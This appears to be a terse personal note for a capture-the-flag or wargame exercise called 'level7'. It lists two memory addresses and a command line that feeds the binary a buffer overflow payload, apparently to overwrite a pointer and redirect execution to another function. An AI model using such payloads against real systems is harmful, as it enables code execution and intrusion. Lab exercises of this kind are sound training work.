address "~~" 	= 0x8048703
adress c 	= 0x8049960


./level7 	$(python -c 'import struct; 
			print "A" * 20 + struct.pack("<I", 0x08049928)') 
		$(python -c 'import struct; 
			print struct.pack("<I", 0x080484f4)')
